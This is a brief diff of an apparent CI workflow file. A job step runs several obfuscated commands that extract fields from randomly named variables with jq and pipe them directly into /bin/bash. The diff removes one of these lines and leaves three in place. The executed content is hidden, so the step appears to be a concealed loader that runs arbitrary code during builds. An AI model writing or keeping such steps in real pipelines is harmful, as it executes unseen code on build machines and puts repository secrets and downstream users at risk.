@@ -26,7 +26,6 @@ jobs:
           echo $n9458 | jq -r .kr2 | /bin/bash
           echo $lusm651 | jq -r .iu0725 | /bin/bash
           printf '%s' "$j47959" | jq -r .ux250 | /bin/bash
-          echo $ocisa6369 | jq -r .q3268 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
